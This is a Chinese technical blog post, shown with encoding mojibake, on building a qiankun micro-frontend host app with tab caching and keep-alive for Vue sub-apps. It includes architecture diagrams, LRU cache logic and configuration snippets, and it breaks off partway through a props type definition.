<li><a href="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF" title="#%E5%AE%9E%E7%8E%B0%E6%80%9D%E8%B7%AF">å®ç°æ€è·¯</a></li>
<li><a href="#qiankun-%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88" title="#qiankun-%E9%85%8D%E7%BD%AE%E6%96%B9%E6%A1%88">Qiankun é…ç½®æ–¹æ¡ˆ</a></li>
<li><a href="#%E5%AD%90%E5%BA%94%E7%94%A8%E9%A1%B5%E7%AD%BE%E7%BC%93%E5%AD%98%E5%AE%9E%E7%8E%B0" title="#%E5%AD%90%E5%BA%94%E7%94%A8%E9%A1%B5%E7%AD%BE%E7%BC%93%E5%AD%98%E5%AE%9E%E7%8E%B0">å­åº”ç”¨é¡µç­¾ç¼“å­˜å®ç°</a></li>
<li><a href="#%E5%AD%90%E5%BA%94%E7%94%A8%E5%88%87%E6%8D%A2%E5%AE%9E%E7%8E%B0" title="#%E5%AD%90%E5%BA%94%E7%94%A8%E5%88%87%E6%8D%A2%E5%AE%9E%E7%8E%B0">å­åº”ç”¨åˆ‡æ¢å®ç°</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90" title="#%E6%A0%B8%E5%BF%83%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90">æ ¸å¿ƒä»£ç è§£æ</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E" title="#%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E">ä½¿ç”¨è¯´æ˜</a></li>
<li><a href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9" title="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">æ³¨æ„äº‹é¡¹</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">é¡¹ç›®æ¦‚è¿°</h3>
<p>åŸºäº <strong>qiankun</strong> å¾®å‰ç«¯æ¡†æ¶å®ç°äº†ä¸€ä¸ªæ”¯æŒ<strong>å¤šé¡µç­¾ç¼“å­˜</strong>å’Œ<strong>å­åº”ç”¨ä¿æ´»</strong>çš„ä¸»åº”ç”¨ç³»ç»Ÿã€‚ä¸»è¦ç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li>âœ… æ‰‹åŠ¨æŒ‚è½½æ¨¡å¼ï¼ˆ<code>loadMicroApp</code>ï¼‰</li>
<li>âœ… å­åº”ç”¨ä¿æ´»ç¼“å­˜æœºåˆ¶</li>
<li>âœ… å¤šé¡µç­¾çŠ¶æ€åŒæ­¥</li>
<li>âœ… å­åº”ç”¨é—´å¿«é€Ÿåˆ‡æ¢</li>
<li>âœ… é¡µé¢åˆ·æ–°è‡ªåŠ¨æ¢å¤</li>
</ul>
<h4 data-id="heading-3">æŠ€æœ¯æ ˆ</h4>
<ul>
<li><strong>ä¸»æ¡†æ¶</strong>: React + TypeScript</li>
<li><strong>å¾®å‰ç«¯æ¡†æ¶</strong>: qiankun</li>
<li><strong>å¾®åº”ç”¨æ¡†æ¶</strong>ï¼švue å…¨å®¶æ¡¶</li>
<li><strong>å¾®åº”ç”¨å…¼å®¹ vite æ–¹æ¡ˆ</strong>ï¼švite-plugin-qiankun</li>
<li><strong>ä¸»åº”ç”¨çŠ¶æ€ç®¡ç†</strong>: Redux Toolkit</li>
<li><strong>ä¸»åº”ç”¨è·¯ç”±</strong>: React Router</li>
<li><strong>ä¸»åº”ç”¨UI ç»„ä»¶åº“</strong>: TDesign</li>
</ul>
<hr/>
<h3 data-id="heading-4">å®ç°æ€è·¯</h3>
<h4 data-id="heading-5">1. æ•´ä½“æ¶æ„è®¾è®¡</h4>
<p>æœ¬æ–¹æ¡ˆé‡‡ç”¨ <strong>"æ‰‹åŠ¨æŒ‚è½½ + å®¹å™¨ä¿æ´»"</strong> çš„æ¶æ„æ¨¡å¼ï¼Œæ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p>
<ul>
<li><strong>ä¸»åº”ç”¨</strong>ï¼ˆReactï¼‰ä½œä¸ºå®¹å™¨å’Œè°ƒåº¦ä¸­å¿ƒï¼Œè´Ÿè´£å¾®åº”ç”¨çš„æ³¨å†Œã€æŒ‚è½½ã€å¸è½½å’ŒçŠ¶æ€ç®¡ç†</li>
<li><strong>å­åº”ç”¨</strong>ï¼ˆVueï¼‰ä½œä¸ºç‹¬ç«‹çš„åŠŸèƒ½æ¨¡å—ï¼Œé€šè¿‡ qiankun ç”Ÿå‘½å‘¨æœŸé’©å­æ¥å…¥</li>
<li><strong>é¡µç­¾ç³»ç»Ÿ</strong>ä½œä¸ºç”¨æˆ·äº¤äº’å±‚ï¼Œç®¡ç†å¤šä¸ªå­åº”ç”¨é¡µé¢çš„æ‰“å¼€ã€åˆ‡æ¢å’Œå…³é—­</li>
<li><strong>ç¼“å­˜æœºåˆ¶</strong>é€šè¿‡ DOM å®¹å™¨å¤ç”¨å®ç°å­åº”ç”¨ä¿æ´»ï¼Œé¿å…é‡å¤æŒ‚è½½å¸¦æ¥çš„æ€§èƒ½æŸè€—</li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph MainApp["ä¸»åº”ç”¨ (React)"]
        TagsView["é¡µç­¾ç®¡ç†&lt;br/&gt;TagsView"]
        Router["è·¯ç”±ç®¡ç†&lt;br/&gt;Router"]
        Redux["çŠ¶æ€ç®¡ç†&lt;br/&gt;Redux"]
        Manager["å¾®åº”ç”¨ç®¡ç†å™¨&lt;br/&gt;registerApp.ts"]
        
        TagsView --&gt; Manager
        Router --&gt; Manager
        Redux --&gt; Manager
    end
    
    subgraph Containers["å®¹å™¨å±‚"]
        Container1["å®¹å™¨1&lt;br/&gt;subApp-app1"]
        Container2["å®¹å™¨2&lt;br/&gt;subApp-app2"]
        Container3["å®¹å™¨3&lt;br/&gt;subApp-app3"]
    end
    
    subgraph SubApps["å­åº”ç”¨å±‚"]
        SubApp1["å­åº”ç”¨1&lt;br/&gt;(Vue)"]
        SubApp2["å­åº”ç”¨2&lt;br/&gt;(Vue)"]
        SubApp3["å­åº”ç”¨3&lt;br/&gt;(Vue)"]
    end
    
    Manager --&gt; Container1
    Manager --&gt; Container2
    Manager --&gt; Container3
    
    Container1 --&gt; SubApp1
    Container2 --&gt; SubApp2
    Container3 --&gt; SubApp3
    
    style MainApp fill:#e1f5ff
    style Containers fill:#fff4e1
    style SubApps fill:#e8f5e9
</code></pre>
<h4 data-id="heading-6">2. æ ¸å¿ƒè®¾è®¡ç†å¿µ</h4>
<h5 data-id="heading-7">2.1 å®¹å™¨éš”ç¦»ç­–ç•¥</h5>
<p><strong>é—®é¢˜</strong>ï¼šqiankun é»˜è®¤çš„ <code>singular: true</code> æ¨¡å¼åªå…è®¸åŒæ—¶æŒ‚è½½ä¸€ä¸ªå­åº”ç”¨ï¼Œåˆ‡æ¢æ—¶éœ€è¦å¸è½½æ—§åº”ç”¨å†æŒ‚è½½æ–°åº”ç”¨ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>åº”ç”¨çŠ¶æ€ä¸¢å¤±</li>
<li>é‡å¤åŠ è½½èµ„æº</li>
<li>ç”¨æˆ·ä½“éªŒå·®</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>è®¾ç½® <code>singular: false</code>ï¼Œå…è®¸å¤šå®ä¾‹å…±å­˜</li>
<li>ä¸ºæ¯ä¸ªå­åº”ç”¨åˆ›å»ºç‹¬ç«‹çš„ DOM å®¹å™¨ï¼ˆ<code>subApp-{appName}</code>ï¼‰</li>
<li>é€šè¿‡ <code>display: none/block</code> æ§åˆ¶å®¹å™¨æ˜¾ç¤º/éšè—</li>
<li>åº”ç”¨å®ä¾‹ä¿ç•™åœ¨å†…å­˜ä¸­ï¼Œå®ç°çœŸæ­£çš„"ä¿æ´»"</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å…³é”®é…ç½®</span>
{
  <span class="hljs-attr">singular</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// å…è®¸å¤šå®ä¾‹</span>
  <span class="hljs-attr">sandbox</span>: {
    <span class="hljs-attr">strictStyleIsolation</span>: <span class="hljs-literal">false</span>,
  }
}

<span class="hljs-comment">// å®¹å™¨åˆ›å»º</span>
<span class="hljs-keyword">const</span> containerId = <span class="hljs-string">`subApp-<span class="hljs-subst">${appName}</span>`</span>
container.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>  <span class="hljs-comment">// åˆå§‹éšè—</span>
</code></pre>
<h5 data-id="heading-8">2.2 LRU ç¼“å­˜æ·˜æ±°ç­–ç•¥</h5>
<p><strong>é—®é¢˜</strong>ï¼šæ— é™ç¼“å­˜ä¼šå¯¼è‡´å†…å­˜æ³„æ¼å’Œæ€§èƒ½é—®é¢˜</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>ç»´æŠ¤ä¸€ä¸ª <code>Map&lt;string, CachedMicroApp&gt;</code> ç¼“å­˜æ± </li>
<li>è®°å½•æ¯ä¸ªåº”ç”¨çš„ <code>lastActiveTime</code>ï¼ˆæœ€åæ¿€æ´»æ—¶é—´ï¼‰</li>
<li>å½“ç¼“å­˜æ•°é‡è¶…è¿‡ <code>MAX_CACHED_APPS</code>ï¼ˆé»˜è®¤ 5ï¼‰æ—¶ï¼Œè‡ªåŠ¨æ¸…ç†æœ€æ—§çš„éå½“å‰åº”ç”¨</li>
<li>ç¡®ä¿å½“å‰æ¿€æ´»çš„åº”ç”¨ä¸ä¼šè¢«æ¸…ç†</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç¼“å­˜ç»“æ„</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">CachedMicroApp</span> = {
  <span class="hljs-attr">instance</span>: <span class="hljs-title class_">QiankunMicroApp</span>    <span class="hljs-comment">// qiankun å®ä¾‹</span>
  <span class="hljs-attr">containerId</span>: <span class="hljs-built_in">string</span>          <span class="hljs-comment">// DOM å®¹å™¨ ID</span>
  <span class="hljs-attr">lastActiveTime</span>: <span class="hljs-built_in">number</span>       <span class="hljs-comment">// æœ€åæ¿€æ´»æ—¶é—´ï¼ˆLRU å…³é”®ï¼‰</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-built_in">string</span>               <span class="hljs-comment">// å…¥å£åœ°å€</span>
}

<span class="hljs-comment">// LRU æ¸…ç†é€»è¾‘</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">cleanupOldestCachedApp</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// æ‰¾åˆ°æœ€æ—§çš„éå½“å‰æ¿€æ´»åº”ç”¨</span>
  <span class="hljs-keyword">let</span> oldestName = <span class="hljs-literal">null</span>
  <span class="hljs-keyword">let</span> oldestTime = <span class="hljs-title class_">Infinity</span>
  cachedMicroApps.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">cached, name</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (name !== currentAppName &amp;&amp; cached.<span class="hljs-property">lastActiveTime</span> &lt; oldestTime) {
      oldestTime = cached.<span class="hljs-property">lastActiveTime</span>
      oldestName = name
    }
  })
  <span class="hljs-keyword">if</span> (oldestName) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">destroyCachedApp</span>(oldestName)
  }
}
</code></pre>
<h5 data-id="heading-9">2.3 çŠ¶æ€åŒæ­¥æœºåˆ¶</h5>
<p><strong>é—®é¢˜</strong>ï¼šä¸»åº”ç”¨çš„é¡µç­¾çŠ¶æ€éœ€è¦åŒæ­¥åˆ°å­åº”ç”¨ï¼Œè®©å­åº”ç”¨çŸ¥é“å“ªäº›é¡µé¢éœ€è¦ç¼“å­˜</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ul>
<li>ä½¿ç”¨ qiankun çš„ <code>initGlobalState</code> åˆ›å»ºå…¨å±€çŠ¶æ€</li>
<li>ä¸»åº”ç”¨åœ¨é¡µç­¾å˜åŒ–æ—¶é€šè¿‡ <code>setGlobalState</code> æ¨é€çŠ¶æ€</li>
<li>å­åº”ç”¨é€šè¿‡ <code>onGlobalStateChange</code> ç›‘å¬çŠ¶æ€å˜åŒ–</li>
<li>çŠ¶æ€åŒ…å« <code>cachedTags</code>ï¼ˆéœ€è¦ç¼“å­˜çš„é¡µç­¾åˆ—è¡¨ï¼‰å’Œ <code>activeTagId</code>ï¼ˆå½“å‰æ¿€æ´»çš„é¡µç­¾ IDï¼‰</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ä¸»åº”ç”¨æ¨é€</span>
<span class="hljs-keyword">const</span> action = <span class="hljs-title function_">initGlobalState</span>({ 
  <span class="hljs-attr">cachedTags</span>: [<span class="hljs-string">'/page1'</span>, <span class="hljs-string">'/page2'</span>], 
  <span class="hljs-attr">activeTagId</span>: <span class="hljs-string">'tag-1'</span> 
})
action.<span class="hljs-title function_">setGlobalState</span>({ cachedTags, activeTagId })

<span class="hljs-comment">// å­åº”ç”¨ç›‘å¬</span>
props.<span class="hljs-title function_">onGlobalStateChange</span>(<span class="hljs-function">(<span class="hljs-params">state</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> { cachedTags, activeTagId } = state
  <span class="hljs-comment">// æ›´æ–°å­åº”ç”¨çš„ keep-alive ç¼“å­˜</span>
  <span class="hljs-title function_">updateKeepAliveCache</span>(cachedTags)
}, <span class="hljs-literal">true</span>)
</code></pre>
<h4 data-id="heading-10">3. å…³é”®æŠ€æœ¯å®ç°</h4>
<h5 data-id="heading-11">3.1 æŒ‚è½½æµç¨‹è®¾è®¡</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([ç”¨æˆ·æ“ä½œ&lt;br/&gt;ç‚¹å‡»é¡µç­¾/è·¯ç”±å˜åŒ–]) --&gt; CheckCache{æ£€æŸ¥ç¼“å­˜ä¸­&lt;br/&gt;æ˜¯å¦å­˜åœ¨è¯¥åº”ç”¨}
    
    CheckCache --&gt;|ç¼“å­˜å‘½ä¸­| HideAll[éšè—æ‰€æœ‰å®¹å™¨]
    CheckCache --&gt;|ç¼“å­˜æœªå‘½ä¸­| CheckFull{æ£€æŸ¥ç¼“å­˜&lt;br/&gt;æ˜¯å¦å·²æ»¡}
    
    HideAll --&gt; ShowTarget[æ˜¾ç¤ºç›®æ ‡å®¹å™¨]
    ShowTarget --&gt; UpdateTime1[æ›´æ–°æ¿€æ´»æ—¶é—´]
    UpdateTime1 --&gt; UpdateURL1[æ›´æ–° URL]
    UpdateURL1 --&gt; TriggerEvent1[è§¦å‘è·¯ç”±äº‹ä»¶]
    TriggerEvent1 --&gt; Return1([è¿”å›å®ä¾‹&lt;br/&gt;å¿«é€Ÿå“åº”])
    
    CheckFull --&gt;|å·²æ»¡| CleanLRU[æ¸…ç†æœ€æ—§åº”ç”¨&lt;br/&gt;LRUç­–ç•¥]
    CheckFull --&gt;|æœªæ»¡| CreateContainer[åˆ›å»ºæ–°å®¹å™¨]
    CleanLRU --&gt; CreateContainer
    
    CreateContainer --&gt; LoadApp[ä½¿ç”¨ loadMicroApp æŒ‚è½½]
    LoadApp --&gt; WaitMount[ç­‰å¾…æŒ‚è½½å®Œæˆ]
    WaitMount --&gt; ShowContainer[æ˜¾ç¤ºå®¹å™¨]
    ShowContainer --&gt; AddCache[åŠ å…¥ç¼“å­˜]
    AddCache --&gt; UpdateTime2[æ›´æ–°æ¿€æ´»æ—¶é—´]
    UpdateTime2 --&gt; TriggerEvent2[è§¦å‘è·¯ç”±äº‹ä»¶]
    TriggerEvent2 --&gt; Return2([è¿”å›å®ä¾‹])
    
    style Start fill:#e1f5ff
    style Return1 fill:#c8e6c9
    style Return2 fill:#c8e6c9
    style CheckCache fill:#fff4e1
    style CheckFull fill:#fff4e1
</code></pre>
<h5 data-id="heading-12">3.2 åˆ‡æ¢ä¼˜åŒ–ç­–ç•¥</h5>
<p><strong>åŒåº”ç”¨å†…åˆ‡æ¢</strong>ï¼š</p>
<ul>
<li>åªéœ€æ›´æ–°è·¯ç”±ï¼ˆ<code>navigate</code>ï¼‰</li>
<li>è§¦å‘ <code>hashchange</code> äº‹ä»¶</li>
<li>å­åº”ç”¨å†…éƒ¨è·¯ç”±å¤„ç†</li>
<li><strong>æ— éœ€é‡æ–°æŒ‚è½½ï¼Œæ€§èƒ½æœ€ä¼˜</strong></li>
</ul>
<p><strong>è·¨åº”ç”¨åˆ‡æ¢</strong>ï¼š</p>
<ul>
<li>æ£€æŸ¥ç›®æ ‡åº”ç”¨æ˜¯å¦åœ¨ç¼“å­˜ä¸­</li>
<li>ç¼“å­˜å‘½ä¸­ï¼šç›´æ¥æ˜¾ç¤ºå®¹å™¨ï¼ˆæ¯«ç§’çº§å“åº”ï¼‰</li>
<li>ç¼“å­˜æœªå‘½ä¸­ï¼šåˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½ï¼ˆé¦–æ¬¡åŠ è½½ï¼‰</li>
<li><strong>ç¼“å­˜å‘½ä¸­æ—¶æ¥è¿‘åŒåº”ç”¨åˆ‡æ¢çš„æ€§èƒ½</strong></li>
</ul>
<h5 data-id="heading-13">3.3 å¸è½½ç­–ç•¥</h5>
<p><strong>ä¿æ´»æ¨¡å¼ä¸‹çš„å¸è½½</strong>ï¼š</p>
<ul>
<li>ä¸æ‰§è¡ŒçœŸæ­£çš„ <code>unmount()</code></li>
<li>ä»…éšè—å®¹å™¨ï¼ˆ<code>display: none</code>ï¼‰</li>
<li>ä¿ç•™åº”ç”¨å®ä¾‹å’ŒçŠ¶æ€</li>
<li><strong>ä¸‹æ¬¡æ¿€æ´»æ—¶ç›´æ¥æ˜¾ç¤ºï¼Œæ— éœ€é‡æ–°æŒ‚è½½</strong></li>
</ul>
<p><strong>å¼ºåˆ¶å¸è½½åœºæ™¯</strong>ï¼š</p>
<ul>
<li>é¡µé¢åˆ·æ–°</li>
<li>ç”¨æˆ·ç™»å‡º</li>
<li>æ‰‹åŠ¨æ¸…ç†ç¼“å­˜</li>
<li>æ‰§è¡ŒçœŸæ­£çš„ <code>unmount()</code> å’Œå®¹å™¨é”€æ¯</li>
</ul>
<h4 data-id="heading-14">4. æ•°æ®æµè®¾è®¡</h4>
<h5 data-id="heading-15">4.1 é¡µç­¾çŠ¶æ€æµ</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([è·¯ç”±å˜åŒ–&lt;br/&gt;location.hash]) --&gt; Listen[TagsView ç›‘å¬&lt;br/&gt;useEffect]
    Listen --&gt; FindMatch[ä» mircoAppHash&lt;br/&gt;æŸ¥æ‰¾åŒ¹é…é¡¹]
    FindMatch --&gt; CheckExist{æ£€æŸ¥é¡µç­¾&lt;br/&gt;æ˜¯å¦å·²å­˜åœ¨}
    
    CheckExist --&gt;|å·²å­˜åœ¨| UpdateActive[æ›´æ–°æ¿€æ´» ID]
    CheckExist --&gt;|ä¸å­˜åœ¨| AddTag[æ·»åŠ æ–°é¡µç­¾]
    
    UpdateActive --&gt; Notify1[é€šçŸ¥å­åº”ç”¨ç¼“å­˜]
    
    AddTag --&gt; UpdateRedux[æ›´æ–° Redux]
    UpdateRedux --&gt; Notify2[é€šçŸ¥å­åº”ç”¨ç¼“å­˜]
    
    style Start fill:#e1f5ff
    style CheckExist fill:#fff4e1
    style Notify1 fill:#c8e6c9
    style Notify2 fill:#c8e6c9
</code></pre>
<h5 data-id="heading-16">4.2 åº”ç”¨æŒ‚è½½æµ</h5>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([é¡µç­¾åˆ‡æ¢&lt;br/&gt;changeHandle]) --&gt; CheckSame{åˆ¤æ–­æ˜¯å¦&lt;br/&gt;åŒåº”ç”¨}
    
    CheckSame --&gt;|åŒåº”ç”¨| UpdateRoute[æ›´æ–°è·¯ç”±]
    CheckSame --&gt;|ä¸åŒåº”ç”¨| MountApp[è°ƒç”¨ mountMicroApp]
    
    UpdateRoute --&gt; TriggerHash[è§¦å‘ hashchange]
    
    MountApp --&gt; CheckCache{æ£€æŸ¥ç¼“å­˜}
    CheckCache --&gt;|ç¼“å­˜å‘½ä¸­| ShowContainer[æ˜¾ç¤ºå®¹å™¨]
    CheckCache --&gt;|ç¼“å­˜æœªå‘½ä¸­| CreateAndMount[åˆ›å»ºå®¹å™¨å¹¶æŒ‚è½½]
    
    ShowContainer --&gt; UpdateURL[æ›´æ–° URL]
    UpdateURL --&gt; Return([è¿”å›å®ä¾‹])
    
    CreateAndMount --&gt; Return
    
    style Start fill:#e1f5ff
    style CheckSame fill:#fff4e1
    style CheckCache fill:#fff4e1
    style Return fill:#c8e6c9
</code></pre>
<h4 data-id="heading-17">5. æ€§èƒ½ä¼˜åŒ–è€ƒè™‘</h4>
<h5 data-id="heading-18">5.1 å†…å­˜ç®¡ç†</h5>
<ul>
<li><strong>é™åˆ¶ç¼“å­˜æ•°é‡</strong>ï¼šæœ€å¤š 5 ä¸ªåº”ç”¨ï¼Œé˜²æ­¢å†…å­˜æº¢å‡º</li>
<li><strong>LRU è‡ªåŠ¨æ¸…ç†</strong>ï¼šè¶…å‡ºé™åˆ¶æ—¶è‡ªåŠ¨æ¸…ç†æœ€æ—§åº”ç”¨</li>
<li><strong>æŒ‰éœ€å¸è½½</strong>ï¼šéä¿æ´»æ¨¡å¼æˆ–å¼ºåˆ¶å¸è½½æ—¶æ‰çœŸæ­£é”€æ¯</li>
</ul>
<h5 data-id="heading-19">5.2 åŠ è½½ä¼˜åŒ–</h5>
<ul>
<li><strong>ç¼“å­˜å‘½ä¸­</strong>ï¼šç›´æ¥æ˜¾ç¤ºå®¹å™¨ï¼Œå“åº”æ—¶é—´ &lt; 10ms</li>
<li><strong>é¦–æ¬¡åŠ è½½</strong>ï¼šä½¿ç”¨ <code>loadMicroApp</code> æŒ‰éœ€åŠ è½½ï¼Œé¿å…é¢„åŠ è½½æ‰€æœ‰åº”ç”¨</li>
<li><strong>å®¹å™¨å¤ç”¨</strong>ï¼šåŒä¸€åº”ç”¨å¤šæ¬¡æ‰“å¼€å¤ç”¨åŒä¸€å®¹å™¨</li>
</ul>
<h5 data-id="heading-20">5.3 çŠ¶æ€åŒæ­¥ä¼˜åŒ–</h5>
<ul>
<li><strong>æ‰¹é‡æ›´æ–°</strong>ï¼šé¡µç­¾å˜åŒ–æ—¶æ‰¹é‡æ¨é€çŠ¶æ€ï¼Œå‡å°‘é€šä¿¡æ¬¡æ•°</li>
<li><strong>æŒ‰éœ€ç›‘å¬</strong>ï¼šå­åº”ç”¨æŒ‰éœ€è®¢é˜…å…¨å±€çŠ¶æ€ï¼Œé¿å…ä¸å¿…è¦çš„æ›´æ–°</li>
</ul>
<h4 data-id="heading-21">6. å…¼å®¹æ€§è®¾è®¡</h4>
<h5 data-id="heading-22">6.1 Vite å­åº”ç”¨æ”¯æŒ</h5>
<ul>
<li>ä½¿ç”¨ <code>vite-plugin-qiankun</code> æ’ä»¶</li>
<li>å­åº”ç”¨éœ€è¦é…ç½®æ­£ç¡®çš„ <code>publicPath</code></li>
<li>æ”¯æŒå¼€å‘ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒçš„ä¸åŒé…ç½®</li>
</ul>
<h5 data-id="heading-23">6.2 è·¯ç”±å…¼å®¹</h5>
<ul>
<li>ä¸»åº”ç”¨ä½¿ç”¨ React Router</li>
<li>å­åº”ç”¨ä½¿ç”¨ Vue Routerï¼ˆhash æ¨¡å¼ï¼‰</li>
<li>é€šè¿‡ <code>window.location.hash</code> å’Œäº‹ä»¶è§¦å‘å®ç°è·¯ç”±åŒæ­¥</li>
</ul>
<h5 data-id="heading-24">6.3 æ ·å¼éš”ç¦»</h5>
<ul>
<li>å½“å‰æœªå¯ç”¨ä¸¥æ ¼æ ·å¼éš”ç¦»ï¼ˆ<code>strictStyleIsolation: false</code>ï¼‰</li>
<li>å»ºè®®å­åº”ç”¨ä½¿ç”¨ CSS Modules æˆ– scoped æ ·å¼</li>
<li>é¿å…å…¨å±€æ ·å¼æ±¡æŸ“</li>
</ul>
<h4 data-id="heading-25">7. é”™è¯¯å¤„ç†ä¸å®¹é”™</h4>
<h5 data-id="heading-26">7.1 æŒ‚è½½å¤±è´¥å¤„ç†</h5>
<ul>
<li>æ•è·å¼‚å¸¸å¹¶æ˜¾ç¤ºé”™è¯¯æç¤º</li>
<li>æ¸…ç†å¤±è´¥çš„å®¹å™¨å’Œç¼“å­˜</li>
<li>å…è®¸ç”¨æˆ·é‡è¯•</li>
</ul>
<h5 data-id="heading-27">7.2 å®¹å™¨ä¸å­˜åœ¨å¤„ç†</h5>
<ul>
<li>è‡ªåŠ¨åˆ›å»ºå®¹å™¨ï¼ˆ<code>ensureContainer</code>ï¼‰</li>
<li>æ”¯æŒå¤šç§çˆ¶å®¹å™¨é€‰æ‹©å™¨é™çº§</li>
<li>å®¹å™¨åˆ›å»ºå¤±è´¥æ—¶æŠ›å‡ºæ˜ç¡®é”™è¯¯</li>
</ul>
<h5 data-id="heading-28">7.3 é¡µé¢åˆ·æ–°æ¢å¤</h5>
<ul>
<li>æ ¹æ®å½“å‰ URL è‡ªåŠ¨è¯†åˆ«éœ€è¦æŒ‚è½½çš„åº”ç”¨</li>
<li>ä»é…ç½®æ˜ å°„è¡¨æŸ¥æ‰¾åŒ¹é…çš„å¾®åº”ç”¨</li>
<li>è‡ªåŠ¨æ¢å¤æŒ‚è½½çŠ¶æ€</li>
</ul>
<hr/>
<p><strong>æ€»ç»“</strong>ï¼šæœ¬æ–¹æ¡ˆé€šè¿‡å®¹å™¨éš”ç¦»ã€LRU ç¼“å­˜ã€çŠ¶æ€åŒæ­¥ç­‰æ ¸å¿ƒæœºåˆ¶ï¼Œå®ç°äº†é«˜æ•ˆçš„å¾®åº”ç”¨é¡µç­¾ç¼“å­˜ç³»ç»Ÿï¼Œåœ¨ä¿è¯ç”¨æˆ·ä½“éªŒçš„åŒæ—¶æœ‰æ•ˆæ§åˆ¶äº†èµ„æºæ¶ˆè€—ã€‚</p>
<h3 data-id="heading-29">Qiankun é…ç½®æ–¹æ¡ˆ</h3>
<h4 data-id="heading-30">1. åŸºç¡€é…ç½®</h4>
<p>é¡¹ç›®é‡‡ç”¨ <strong>æ‰‹åŠ¨æŒ‚è½½æ¨¡å¼</strong>ï¼ˆ<code>loadMicroApp</code>ï¼‰ï¼Œè€Œéè·¯ç”±è‡ªåŠ¨æ³¨å†Œæ¨¡å¼ï¼ˆ<code>registerMicroApps</code>ï¼‰ã€‚è¿™ç§æ–¹å¼æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶èƒ½åŠ›ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦ä¿æ´»ç¼“å­˜çš„åœºæ™¯ã€‚</p>
<h5 data-id="heading-31">æ ¸å¿ƒé…ç½®å‚æ•°</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/utils/registerApp.ts</span>

<span class="hljs-comment">// æ²™ç®±é…ç½®</span>
<span class="hljs-keyword">const</span> sandboxConfig = {
  <span class="hljs-attr">sandbox</span>: {
    <span class="hljs-attr">strictStyleIsolation</span>: <span class="hljs-literal">false</span>,        <span class="hljs-comment">// ä¸å¯ç”¨ä¸¥æ ¼æ ·å¼éš”ç¦»</span>
    <span class="hljs-attr">experimentalStyleIsolation</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// ä¸å¯ç”¨å®éªŒæ€§æ ·å¼éš”ç¦»</span>
  },
  <span class="hljs-attr">singular</span>: <span class="hljs-literal">false</span>,  <span class="hljs-comment">// å…è®¸å¤šå®ä¾‹åŒæ—¶å­˜åœ¨ï¼ˆä¿æ´»å¿…éœ€ï¼‰</span>
}
</code></pre>
<h5 data-id="heading-32">å¾®åº”ç”¨é…ç½®ç±»å‹</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MicroAppConfig</span> = {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>          <span class="hljs-comment">// å¾®åº”ç”¨åç§°ï¼ˆå”¯ä¸€æ ‡è¯†ï¼‰</span>
  <span class="hljs-attr">entry</span>: <span class="hljs-built_in">string</span>        <span class="hljs-comment">// å¾®åº”ç”¨å…¥å£åœ°å€</span>
  <span class="hljs-attr">container</span>: <span class="hljs-built_in">string</span>    <span class="hljs-comment">// å®¹å™¨é€‰æ‹©å™¨</span>
  <span class="hljs-attr">activeRule</span>: <span class="hljs-built_in">string</span>   <span class="hljs-comment">// æ¿€æ´»è§„åˆ™ï¼ˆè·¯ç”±åŒ¹é…ï¼‰</span>
  <span class="hljs-attr">props</span>: <span class="hljs-title class_">MicroAppProps</span> <span class="hljs-comment">// ä¼ é€’ç»™å­åº”ç”¨çš„ props</span>
}
</code></pre>
<h4 data-id="heading-33">2. å¾®åº”ç”¨ Props é…ç½®ï¼ˆæˆ‘è‡ªå·±çš„é¡¹ç›®æ˜¯è¿™æ ·çš„å¯ä»¥æ ¹æ®å®é™…è¿›è¡Œæ›´æ”¹ï¼‰</h4>
<p>ä¸»åº”ç”¨é€šè¿‡ <code>props</code> å‘å­åº”ç”¨ä¼ é€’å¿…è¦çš„ä¸Šä¸‹æ–‡å’Œæ–¹æ³•ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">type</span> <span class="hljs-title class_">MicroAppProps</span> = {
